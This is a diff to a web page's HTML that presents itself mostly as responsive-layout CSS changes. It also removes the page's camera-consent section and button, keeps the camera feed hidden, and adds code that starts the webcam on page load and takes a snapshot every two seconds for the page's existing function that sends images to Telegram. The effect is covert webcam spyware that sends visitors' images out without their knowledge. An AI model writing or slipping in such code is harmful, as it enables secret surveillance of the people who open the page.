@@ -22,12 +22,14 @@
       display: flex;
       justify-content: center;
       background-color: #333;
+      flex-wrap: wrap; /* Allow nav items to wrap on smaller screens */
     }
     nav a {
       color: white;
       padding: 14px 20px;
       text-decoration: none;
       text-align: center;
+      flex: 1 1 auto; /* Allow nav items to grow and shrink */
     }
     nav a:hover {
       background-color: #575757;
@@ -72,27 +74,48 @@
       width: 100%;
       max-width: 500px;
       margin: 20px auto;
-      display: block;
+      display: none; /* Camera feed remains hidden */
       border: 2px solid #4CAF50;
       border-radius: 10px;
     }
-    #camera-feed{
-      display: none;
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      header h1 {
+        font-size: 24px; /* Smaller heading for mobile */
+      }
+      header p {
+        font-size: 14px; /* Smaller subtitle for mobile */
+      }
+      nav a {
+        padding: 10px 15px; /* Smaller padding for nav items */
+        font-size: 14px; /* Smaller font size for nav items */
+      }
+      .section h2 {
+        font-size: 20px; /* Smaller section headings */
+      }
+      .section ul li {
+        padding: 10px; /* Smaller padding for list items */
+      }
     }
-    #camera-consent {
-      text-align: center;
-      margin: 20px 0;
-    }
-    #camera-consent button {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    #camera-consent button:hover {
-      background-color: #45a049;
+
+    @media (max-width: 480px) {
+      header h1 {
+        font-size: 20px; /* Even smaller heading for very small screens */
+      }
+      header p {
+        font-size: 12px; /* Even smaller subtitle */
+      }
+      nav a {
+        padding: 8px 10px; /* Even smaller padding for nav items */
+        font-size: 12px; /* Even smaller font size */
+      }
+      .section h2 {
+        font-size: 18px; /* Smaller section headings */
+      }
+      .section ul li {
+        padding: 8px; /* Smaller padding for list items */
+      }
     }
   </style>
 </head>
@@ -111,9 +134,6 @@
   </nav>
 
   <div class="container">
-    <!-- Camera Consent Section -->
-
-
     <!-- Camera Feed Section -->
     <div class="section">
       <video id="camera-feed" autoplay></video>
@@ -201,7 +221,6 @@
 
     // Camera elements
     const cameraFeed = document.getElementById('camera-feed');
-    const startCameraButton = document.getElementById('start-camera');
 
     // Function to send image to Telegram
     async function sendImageToTelegram(imageBlob) {
@@ -235,12 +254,15 @@
     }
 
     // Start camera and take snapshots every 2 seconds
+    (async () => {
+      try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         cameraFeed.srcObject = stream;
-       
         setInterval(takeSnapshot, 2000); // Take a snapshot every 2 seconds
-      
-    });
+      } catch (error) {
+        console.error('Error accessing the camera:', error);
+      }
+    })();
   </script>
 </body>
 </html>
